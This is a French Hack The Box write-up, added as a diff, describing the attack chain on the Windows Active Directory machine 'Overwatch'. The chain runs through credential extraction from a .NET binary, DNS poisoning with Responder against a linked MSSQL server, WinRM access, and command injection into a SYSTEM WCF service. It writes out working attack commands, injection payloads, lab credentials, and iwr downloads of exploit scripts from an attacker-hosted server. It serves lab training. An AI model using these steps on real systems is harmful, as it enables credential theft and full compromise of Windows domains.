@@ -1,0 +1,313 @@
+# 🧠 HTB Write-up : Overwatch (Moyen)
+
+| **Machine** | Overwatch |
+| **Difficulté** | Moyen |
+| **OS** | Windows |
+| **Release** | Saison 10 |
+| **Techniques** | Énumération AD, MSSQL, interception d'authentification, injection de commande, élévation de privilèges |
+
+---
+
+## 📌 Résumé
+
+Overwatch est une machine Windows de difficulté moyenne qui démontre une chaîne d'attaque réaliste sur un environnement Active Directory :
+
+1. **Énumération** des services AD (Kerberos, LDAP, SMB, WinRM) et découverte d'un serveur MSSQL sur un port non standard
+2. **Extraction d'identifiants** depuis un binaire .NET et un fichier de configuration sur un partage SMB
+3. **Authentification MSSQL** avec les identifiants extraits
+4. **Exploitation d'un serveur lié (linked server)** avec redirection DNS et capture d'authentification via Responder
+5. **Accès initial** via WinRM avec les identifiants capturés
+6. **Élévation de privilèges** par injection de commande dans un service WCF vulnérable tournant en tant que SYSTEM
+
+---
+
+## 🔍 Reconnaissance
+
+### Scan Nmap initial
+
+```bash
+nmap -sCV -A 10.129.244.81
+Ports ouverts détectés :
+
+53/tcp → DNS
+
+88/tcp → Kerberos
+
+135/tcp → MSRPC
+
+139/tcp → NetBIOS
+
+389/tcp → LDAP
+
+445/tcp → SMB
+
+3389/tcp → RDP
+
+5985/tcp → WinRM
+
+3268/tcp → Global Catalog LDAP
+
+Le domaine révélé par LDAP : overwatch.htb
+
+Scan full ports
+bash
+nmap -p- --min-rate 5000 10.129.244.81
+Ports supplémentaires découverts :
+
+6520/tcp → MSSQL (non standard)
+
+9389/tcp → ADWS (Active Directory Web Services)
+
+Configuration du fichier hosts
+bash
+echo "10.129.244.81 overwatch.htb S200401.overwatch.htb" | sudo tee -a /etc/hosts
+📁 Énumération SMB
+Découverte des partages
+bash
+smbclient -L //10.129.244.81
+Partages intéressants :
+
+NETLOGON (partage DC)
+
+SYSVOL (partage DC)
+
+software$ (partage personnalisé)
+
+Exploration du partage software$
+bash
+smbclient //10.129.244.81/software$ -N -c "recurse ON; ls"
+Découverte d'un répertoire Monitoring contenant :
+
+overwatch.exe
+
+overwatch.exe.config
+
+overwatch.pdb
+
+Bibliothèques Entity Framework et SQLite
+
+Récupération des fichiers
+bash
+smbclient //10.129.244.81/software$ -N -c "get Monitoring\overwatch.exe.config overwatch.exe.config"
+smbclient //10.129.244.81/software$ -N -c "get Monitoring\overwatch.exe overwatch.exe"
+🔍 Analyse du fichier de configuration
+overwatch.exe.config révèle :
+
+xml
+<baseAddresses>
+  <add baseAddress="http://overwatch.htb:8000/MonitorService" />
+</baseAddresses>
+<serviceDebug includeExceptionDetailInFaults="True" />
+→ Service WCF exposé sur le port 8000
+
+🔬 Reverse Engineering du binaire
+Extraction des chaînes
+bash
+strings -el overwatch.exe
+Découverte d'une chaîne de connexion SQL :
+
+text
+Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
+Décompilation avec ILSpy
+bash
+dotnet tool install ilspycmd --version 8.2.0.7535 -g
+~/.dotnet/tools/ilspycmd overwatch.exe
+Interface IMonitoringService :
+
+StartMonitoring() → souscrit aux événements WMI
+
+StopMonitoring()
+
+KillProcess(string processName)
+
+Méthode vulnérable KillProcess :
+
+csharp
+string text = "Stop-Process -Name " + processName + " -Force";
+→ Injection de commande possible
+
+🔐 Validation des identifiants
+Test SMB
+bash
+netexec smb 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --shares
+✅ Identifiants valides
+
+Test WinRM
+bash
+netexec winrm 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'
+❌ Échec - sqlsvc n'a pas accès WinRM
+
+🗄️ Authentification MSSQL
+bash
+netexec mssql 10.129.244.81 --port 6520 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -q "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');"
+✅ Authentification réussie
+
+Utilisateur : OVERWATCH\sqlsvc
+
+Rôle sysadmin : 0 (pas admin)
+
+👥 Énumération des utilisateurs du domaine
+bash
+netexec smb 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --users
+Comptes intéressants :
+
+sqlsvc
+
+sqlmgmt
+
+105 utilisateurs au total
+
+🔎 Énumération LDAP
+bash
+ldapsearch -x -H ldap://10.129.244.81 -D "overwatch\sqlsvc" -w 'TI0LKcfHzZw1Vv' -b "DC=overwatch,DC=htb" "(sAMAccountName=sqlmgmt)" memberOf
+Résultat :
+
+text
+memberOf: CN=Remote Management Users,CN=Builtin,DC=overwatch,DC=htb
+→ sqlmgmt peut utiliser WinRM
+
+🔗 Énumération des serveurs liés MSSQL
+bash
+netexec mssql 10.129.244.81 --port 6520 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -q "SELECT name, provider, data_source FROM sys.servers;"
+Serveur lié découvert :
+
+text
+name: SQL07
+provider: SQLNCLI
+data_source: SQL07
+🎯 Exploitation du serveur lié
+Lancement de Responder
+bash
+sudo responder -I tun0 -v
+Ajout d'un enregistrement DNS malveillant
+bash
+python3 /usr/share/responder/tools/DNSUpdate.py -DNS 10.129.244.81 -u 'overwatch\sqlsvc' -p 'TI0LKcfHzZw1Vv' -a "ad" -r "SQL07" -d "10.10.14.129"
+Capture des identifiants
+Responder capture :
+
+text
+[MSSQL] Cleartext Username : sqlmgmt
+[MSSQL] Cleartext Password : bIhBbzMMnB82yx
+bash
+cat /usr/share/responder/logs/MSSQL-Cleartext-ClearText-10.129.244.81.txt
+✅ Identifiants récupérés : sqlmgmt : bIhBbzMMnB82yx
+
+🚪 Accès initial via WinRM
+bash
+netexec winrm 10.129.244.81 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
+✅ Authentification réussie (Pwn3d!)
+
+Connexion avec Evil-WinRM
+bash
+evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
+Flag utilisateur
+powershell
+cd Desktop
+cat user.txt
+text
+********************************
+⚡ Élévation de privilèges - Exploitation du service WCF
+Contexte
+Service vulnérable sur http://localhost:8000/MonitorService
+
+Méthode KillProcess vulnérable à l'injection de commande
+
+Le service tourne en tant que SYSTEM
+
+Création de l'exploit (sur Kali)
+exploit.ps1 :
+
+powershell
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("Content-Type","text/xml")
+$wc.Headers.Add("SOAPAction",'"http://tempuri.org/IMonitoringService/KillProcess"')
+
+$body = @'
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+  <s:Body>
+    <KillProcess xmlns="http://tempuri.org/">
+      <processName>a; whoami #</processName>
+    </KillProcess>
+  </s:Body>
+</s:Envelope>
+'@
+
+$wc.UploadString("http://localhost:8000/MonitorService",$body)
+Hébergement de l'exploit
+bash
+python3 -m http.server 7070
+Téléchargement et exécution sur la cible
+powershell
+cd C:\Windows\Temp
+iwr http://10.10.14.129:7070/exploit.ps1 -OutFile exploit.ps1
+powershell -ExecutionPolicy Bypass -File exploit.ps1
+Réponse du service
+xml
+<KillProcessResult>
+nt authority\system
+</KillProcessResult>
+✅ Confirmation d'exécution en tant que SYSTEM
+
+🏆 Récupération du flag root
+Script rootscript.ps1
+powershell
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("Content-Type","text/xml; charset=utf-8")
+$wc.Headers.Add("SOAPAction",'"http://tempuri.org/IMonitoringService/KillProcess"')
+
+$body = @"
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+  <s:Body>
+    <KillProcess xmlns="http://tempuri.org/">
+      <processName>a; type C:\Users\Administrator\Desktop\root.txt #</processName>
+    </KillProcess>
+  </s:Body>
+</s:Envelope>
+"@
+
+$wc.UploadString("http://localhost:8000/MonitorService",$body)
+Exécution
+powershell
+iwr http://10.10.14.129:7070/rootscript.ps1 -OutFile rootscript.ps1
+powershell -ExecutionPolicy Bypass -File rootscript.ps1
+Flag root
+xml
+<KillProcessResult>
+********************************
+</KillProcessResult>
+📁 Flags
+Flag	Emplacement
+Utilisateur	C:\Users\sqlmgmt\Desktop\user.txt
+Root	C:\Users\Administrator\Desktop\root.txt
+🧰 Outils utilisés
+Outil	Rôle
+nmap	Scan de ports et services
+smbclient	Énumération des partages SMB
+netexec	Authentification et énumération
+ldapsearch	Requêtes LDAP
+responder	Capture d'authentification
+DNSUpdate.py	Ajout d'enregistrement DNS
+evil-winrm	Accès PowerShell distant
+ilspycmd	Décompilation .NET
+python3	Hébergement HTTP
+🔗 Références
+Responder
+
+Evil-WinRM
+
+ILSpy
+
+🧠 Leçons apprises
+Toujours énumérer les partages SMB personnalisés
+
+Les fichiers de configuration et binaires .NET peuvent contenir des identifiants
+
+Les serveurs MSSQL liés peuvent être abusés pour capturer des identifiants
+
+Responder + DNSUpdate est une combinaison puissante
+
+Les services WCF exposés localement peuvent être vulnérables à l'injection de commande
+
+Toujours vérifier les permissions WinRM des comptes découverts
